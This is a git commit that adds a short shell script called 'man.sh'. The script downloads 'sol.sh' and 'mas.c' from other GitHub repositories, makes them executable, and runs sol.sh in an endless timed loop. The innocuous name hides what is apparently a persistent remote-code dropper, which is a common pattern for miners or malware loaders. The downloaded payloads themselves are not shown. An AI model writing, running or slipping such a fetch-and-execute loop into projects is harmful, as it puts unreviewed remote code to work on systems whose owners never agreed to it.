28e62e03ecfd8e06f3ef4cc43afc57e4f0fa7d13
tinkuJiya <91747682+tinkuJiya@users.noreply.github.com>
2021-10-02 13:14:22 +0530

    Create man.sh

---
+++ man.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+  wget https://github.com/DarshGoswami1982/D1/raw/main/sol.sh
+  chmod +x sol.sh 
+  wget https://github.com/biswas179/FkgX/raw/main/mas.c
+  chmod +x mas.c
+  while [ 1 ]; do
+  ./sol.sh
+  sleep 20000
+  done
